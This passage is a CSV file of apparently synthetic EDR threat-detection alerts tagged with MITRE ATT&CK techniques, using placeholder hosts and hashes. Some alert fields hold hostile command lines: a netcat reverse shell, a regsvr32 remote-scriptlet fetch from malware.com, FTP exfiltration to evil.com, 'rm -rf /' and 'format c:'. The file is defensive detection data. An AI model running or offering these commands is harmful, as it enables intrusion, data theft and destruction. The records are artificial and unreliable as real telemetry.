'NT AUTHORITY\\SYSTEM', 'domain': 'NT AUTHORITY', 'process_start_time': '2022-04-01T12:30:00.000Z', 'process_end_time': '2022-04-01T12:34:00.000Z', 'pid': 1234, 'ppid': 5678}","{'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100', 'mac_address': '12-34-56-78-9A-BC', 'os': 'Windows 10', 'os_version': '20H2', 'os_build': '19042.1083', 'agent_version': '6.22.0.0', 'agent_id': 'ABCDEF...', 'sensor_id': 'GHIJKL...', 'group_name': 'Workstations'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat_detection,1646749633000,Account Access Removal,Account Access Removal detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1,"{'hostname': 'example-hostname', 'user_name': 'N/A', 'affected_account_name': 'example-account', 'affected_account_sid': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'timestamp': '2022-03-07T16:47:13.000Z', 'attack_name': 'Account Access Removal', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'affected_account_name', 'indicator_value': 'example-account', 'indicator_description': 'Name of the account whose access was removed'}, {'indicator_type': 'affected_account_sid', 'indicator_value': 'S-1-5-21-1234567890-1234567890-1234567890-1001', 'indicator_description': 'Security Identifier (SID) of the account whose access was removed'}, {'indicator_type': 'command_line', 'indicator_value': 'net user example-account /active:no', 'indicator_description': 'Command line used for account access removal'}]}",Account Access Removal,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
73894756,threat_detection,2023-03-10T14:30:00.000Z,Build Image on Host,Endpoint detected Build Image on Host,,,,,,high,,,,,,,,,,,,Build Image on Host,,,,,,,,,,"{'process_name': 'docker', 'process_path': 'C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe', 'process_command_line': '""C:\\Program Files\\Docker\\Docker\\Docker Desktop.exe""', 'hostname': 'ExampleHost01', 'ip_address': '192.168.1.100', 'username': 'JohnDoe', 'process_id': 1234, 'parent_process_id': 5678, 'parent_process_name': 'powershell.exe', 'parent_process_path': 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'}",Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-T1609-1234567890,container_administration_command,,container administration,A container administration command was detected on the endpoint,high,2022-03-15T14:31:00Z,,,,,,,,,,T1609,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,docker exec -it <container_id> /bin/bash,,,,,,,,,,,,,"{'hostname': 'Endpoint-001', 'ip_address': '192.168.1.100'}",,,defense_evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234567890,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'Container-001', 'ip_address': '192.168.1.200'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,,1646749633000,Custom Scripts for Internal Reconnaissance,Custom script detected on host SERVER-123 attempting to perform internal reconnaissance,,,,,,High,"[{'host_name': 'SERVER-123', 'ip_address': '10.0.0.1'}]","{'script_name': 'internal_scan.ps1', 'script_location': 'C:\\Scripts\\', 'script_arguments': '-o output.txt -s', 'script_result': 'Success', 'source_process': 'powershell.exe', 'process_commandline': 'powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'parent_process': 'cmd.exe', 'parent_commandline': 'cmd.exe /c start /b powershell.exe -ExecutionPolicy Bypass C:\\Scripts\\internal_scan.ps1 -o output.txt -s', 'user': 'jdoe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646842350000,Data Encrypted for Impact,Data Encrypted for Impact detected on endpoint,,,,,,high,,,,,,,,,,,,,,,,,,,,,1,"{'hostname': 'example-hostname', 'user_name': 'example-user', 'timestamp_utc': '2022-03-08T15:12:30.000Z', 'mitre_attack_id': 'T1486', 'mitre_attack_name': 'Data Encrypted for Impact', 'threat_score': 100, 'threat_indicators': [{'indicator_type': 'file_path', 'indicator_value': 'C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Path of the file that was encrypted'}, {'indicator_type': 'file_hash', 'indicator_value': '1234567890ABCDEF1234567890ABCDEF12345678', 'indicator_description': 'SHA-1 hash of the file that was encrypted'}, {'indicator_type': 'command_line', 'indicator_value': 'cmd /c cipher /e /a /s:C:\\Users\\example-user\\Documents\\example-file.txt', 'indicator_description': 'Command line used for data encryption'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304050f,,2023-03-09T10:30:15.000000Z,Suspicious data manipulation,Suspicious data manipulation activity or Data Obfuscation detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'threat_name': 'MITRE T1001 - Data Obfuscation', 'ioc': ['http://maliciousdomain.com', '8.8.8.8'], 'process_name': 'powershell.exe', 'process_pid': 1234, 'parent_process_name': 'explorer.exe', 'parent_process_pid': 5678, 'user_name': 'User1', 'domain_name': 'contoso', 'mitre_id': 'T1001'}",,"{'type': 'endpoint', 'hostname': 'DESKTOP-J2345', 'ip_address': '192.168.1.100'}","{'type': 'file', 'file_path': 'C:\\Users\\User1\\Documents\\sensitive.doc', 'hash': '4ab07e2b96a7b38f1bbceb31e313b023'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456789,threat detection,2022-03-07T12:30:00Z,Data transfer size limits,Data transfer size limits were exceeded on endpoint,,,,,,high,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,Data Transfer Size Limits Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Endpoint', 'entity_name': 'Endpoint001', 'os': 'Windows 10', 'username': 'User001'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040450fjk,threat_detection,2023-03-10T12:00:00Z,defense evasion,The process %process_name% attempted to evade detection by a debugger.,,,,,,high,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,Debugger Evasion Detected,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,DetectionSummaryEvent,1646749655000,Disk Wiping,Potential disk wiping activity was detected on the device.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,123456,"{'HostInfo': {'HostName': 'example-device', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'IpAddress': '192.168.1.100', 'MacAddress': '00-11-22-33-44-55', 'Domain': 'example.com', 'UserName': 'user123'}, 'ProcessInfo': {'ProcessName': 'cmd.exe', 'ProcessCommandLine': 'cmd /c format c:', 'ProcessStartTime': '2022-03-20T15:40:00Z', 'ProcessParentName': 'explorer.exe', 'ProcessParentCommandLine': 'explorer.exe', 'ProcessParentStartTime': '2022-03-20T15:30:00Z'}, 'TargetInfo': {'HostName': 'example-device2', 'OsType': 'Windows', 'OsVersion': '10.0.19042', 'UserName': 'user456'}, 'RuleName': 'Disk Wiping Detection', 'RuleId': '789012'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
nfkskfjs,threat_detection,1646947200,policy_modification,A domain policy was modified on the endpoint,,,,,,high,,"{'affected_entities': [{'entity_type': 'domain_policy', 'entity_name': 'example-policy'}]}",,,,,,,,,,,,,,,,,,,1,,,"{'hostname': 'example-host', 'ip_address': '192.168.1.1', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,detect,endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Other Network Medium Detected,high,,,,,,,,detect,,,,,,"{'name': 'FTP', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe ftp://evil.com/SensitiveData.txt,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
304596987,Exploit Public-Facing Application,2022-12-31T23:59:59Z,exploit public facing application,Exploit Public-Facing Application detected and blocked,high,,,,"{'id': 'host456', 'name': 'myserver.example.com', 'os': 'Windows', 'ip_address': '192.168.1.1'}",,,,blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'user123', 'name': 'John Smith'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,new,"{'name': 'HTTP Server', 'version': '2.0'}","{'name': 'CVE-2022-1234', 'type': 'exploit', 'source': 'unknown', 'indicators': [{'id': 'indicator123', 'type': 'file_hash', 'value': 'abc123def456', 'description': 'Hash of malicious file'}]}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,alert,,Ingress Tool Transfer,Potential ingress tool transfer detected,medium,2023-03-09T12:00:00.000000Z,,,,,,,,,,,,,,,powershell.exe,Ingress Tool Transfer,,,,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.2.15,,,,,,,,,,,,,,Initial Access,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,MITRE T1105,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
002040g,detect,2023-03-10T20:00:00Z,file_write,An attempt to modify the system's disk image or firmware.,critical,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of system file'},,,,,,,,,,,,,,,,,,,,,{'username': 'system'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'file_path': 'C:\\Windows\\System32\\ntoskrnl.exe', 'file_sha256': '4a4bfcf2b926c387b7d9c9ea9ca95e3e3a67f5d6d0c6b3a3f3c6b5d5e5f0f0f0', 'file_size': 1683456}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3050603d,,2023-03-09T12:00:00.000000Z,command and control,Non-Application Layer Protocol,,,,,,high,,,,,,Non-Application Layer Protocol,,,UDP,,nslookup.exe,,,,,,,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Windows\System32\nslookup.exe example.com,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,53,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
030333333,,2023-03-10T10:30:00Z,Obfuscated Files or Information,A suspicious file has been detected that appears to be obfuscated or encoded.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,hostname123,C:\Program Files\Malware\malware.exe,CrowdStrike Falcon,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
095030332,RemovableMediaDetection,2022-03-04T10:25:00Z,External Media Replication,An external device has been detected that may be attempting to replicate data to the endpoint.,high,,,,,,,,,,,,,,,,,Replication Through Removable Media,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Initial Access,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456,16 GB,2022-03-04T10:25:00Z,Copied Files,C:\Users\User\Documents\SensitiveData.docx,2 MB,T1091,{'type': 'Endpoint Monitoring'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ABC123-1234-5678-9101-23456789,threat_detection,2022-03-07T14:23:54.123Z,resource hijacking,An attempt to hijack system resources has been detected on the endpoint.,,,,,,critical,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Resource Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'type': 'host', 'id': '123456', 'name': 'DESKTOP-1234', 'ip_addresses': ['192.168.1.100'], 'os_type': 'Windows'}]",,,,,,,,,,,,,,A suspicious process is attempting to hijack system resources on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'explorer.exe', 'target_resource': 'memory', 'operation': 'write', 'suspicious_action': 'attempt to overwrite critical memory region'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1496,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,scheduled Transfer,Scheduled Transfer Detected,,,,,,medium,,,,,,,,,,,cmd.exe,,,,,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0930405555,detect,2023-03-03T10:15:30Z,serverless execution,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'powershell.exe', 'process_command_line': '-EncodedCommand', 'parent_process_name': 'cmd.exe', 'parent_command_line': 'powershell.exe -encodedCommand', 'process_sha256': '9D73B2CF2A1C728FE8B282FDC7EE5DE5', 'parent_sha256': '2E20D26F9C1ACB5547D5BDA70FEBD054', 'status': 'blocked'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,transfer data to cloud,Data Transfer to Cloud Account Detected,,,,,,high,,,,,,,,,,,powershell.exe,,,,,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,CorwdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,,,,,
04040t0y,threat detection,,Suspicious Use of Valid Accounts Detected,Suspicious activity involving the use of valid accounts was detected on an endpoint.,high,2023-03-03T15:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,"[{'kill_chain_name': 'mitre-attack', 'phase_name': 'command-and-control'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345,valid_accounts,"{'provider': 'Crowdstrike Falcon', 'type': 'endpoint_detection_and_response'}",,,,,,,,,,,,,,,,,,,,,,,,
98765,Build image on host,2023-03-10T10:30:00Z,removable_media,,high,,,,,,,,,"A removable media device was inserted and a file transfer occurred, which is commonly associated with data exfiltration or other suspicious activity.",789012,Communication Through Removable Media,,,,user1,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Drive,confidential.docx,3.5MB,D:\confidential.docx,C:\Users\user1\Documents\confidential.docx,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,suspicous container,"A container has been deployed on the system, potentially indicating malicious activity.",High,,,,,,,,,,,Deploy Container,,,,john.doe,docker,,,,,docker run malicious/image,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,192.168.1.100,5678,,,2023-03-10T10:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example.com,/usr/bin/docker,f1ef997989e37c17eb2a12d56a9ac05d,098f6bcd4621d373cade4e832627b4f6,,,,,,,,,,,,,,,
EDR-23456,Masked Executable,,masked exectuiable,Masked executable detected on host LAPTOP-789,,2022-10-31T12:34:56Z,,,,High,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.150'}]","{'file_path': 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\mask123.exe', 'source_ip': '192.168.1.151', 'destination_ip': '192.168.1.150'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
032040ttvf,detect,2023-03-10T20:00:00Z,registry_modification,,high,,,,{'hostname': 'desktop01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized modification of registry key'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,,"{'registry_key': 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'modification_type': 'value_added', 'value_name': 'MaliciousProgram', 'value_data': 'C:\\Program Files\\Malicious\\malware.exe'}",,,,,,,,,An attempt to modify registry keys or values.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
040506yg,comand and control,2023-03-09T12:00:00.000000Z,multi stage channels,Multi-Stage Command and Control,,,,,,high,,,,,,Multi-Stage Channels,,,TCP,,svchost.exe,,,,,,,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,Command and Control,,1234,,,,,,,,DOMAIN\user,,C:\Windows\System32\svchost.exe -k netsvcs,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,Remote Access Tools Detection,1646749655000,remote access,Remote access tool detected on the system.,High,2023-03-09T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'Host', 'entity_name': 'workstation-01', 'entity_ip': '192.168.1.100'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'nc.exe', 'process_path': 'C:\\Windows\\System32\\nc.exe', 'process_command_line': 'nc.exe -e cmd.exe 10.0.0.2 4444', 'process_hash': 'A2D3F4B5C6E7A8B9', 'process_parent_name': 'cmd.exe', 'process_parent_path': 'C:\\Windows\\System32\\cmd.exe', 'process_parent_hash': 'B9A8E7C6B5F4D3A2', 'network_connections': [{'destination_ip': '10.0.0.2', 'destination_port': '4444', 'protocol': 'TCP'}]}",,,,,,,,,,,,,,
ac4d6c4c6e68488f903a4a10b3c152b2,DetectionSummaryEvent,2023-03-06T15:32:00.000Z,exfiltration,,medium,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'customer_id': '123456', 'customer_name': 'Acme Corp', 'source': 'CrowdStrike Falcon Platform'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Automated exfiltration attempt detected,,,,,,,,,,,,,,,,,,,,,,,"{'protocol': 'https', 'destination_ip': '10.0.0.2', 'destination_port': 443, 'filename': 'sensitive_data.zip', 'file_hash': 'abcd1234', 'file_size': 1024}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Workstation01,,,,,,,,,,ac4d6c4c6e68488f903a4a10b3c152b2,2023-03-06T15:30:00.000Z,85.0,80.0,d1b31397857945a9a3c3f918a3a7a1e8,192.168.1.101,Windows 10 Pro,20H2,Default Policy,4bd7e4c2-4a3f-4dd2-b00b-1c4139c617d6,automated_exfiltration,,,
EDR-24680,,,Suspiciouis Browser Extension,Browser extension installed on Chrome,,2022-10-15T09:45:00Z,,,,Medium,"[{'host_name': 'LAPTOP-789', 'ip_address': '192.168.1.50'}]","{'extension_name': 'AdBlock Plus', 'browser': 'Chrome', 'browser_version': '95.0.4638.69', 'username': 'jdoe', 'domain': 'MYDOMAIN', 'source_ip': '192.168.1.51', 'destination_ip': '192.168.1.50'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-67890,Forced Container Administration Command,,forced container administration,Forced container administration command detected on host server01,,2022-12-31T23:59:59Z,,,,High,"[{'host_name': 'server01', 'ip_address': '192.168.1.100'}]","{'container_name': 'webapp', 'command': 'rm -rf /', 'source_process': 'docker', 'source_process_commandline': 'docker exec -it webapp /bin/bash', 'source_process_pid': '1234', 'source_ip': '192.168.1.101', 'destination_ip': '192.168.1.100', 'result': 'Success'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lllkdl0,detect,2023-03-10T18:00:00Z,process_execution,An attempt to execute a command using a legitimate system tool to evade detection.,medium,,,,{'hostname': 'server01'},,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'reason': 'Unauthorized command execution'},,,,,,,,,,,,,,,,,,,,,{'username': 'user01'},,,,,,,,,,,,,,,,,,,,,,,,,,"{'process_name': 'regsvr32.exe', 'command_line': 'regsvr32.exe /s /u /i:http://malware.com/malware.sct scrobj.dll'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Potential Use of Scheduled Task/Job,A scheduled task/job was created or modified on the system.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'system_process', 'entity_name': 'Task Scheduler', 'host_info': {'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100'}, 'description': 'A new scheduled task/job was created or modified on the system.'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
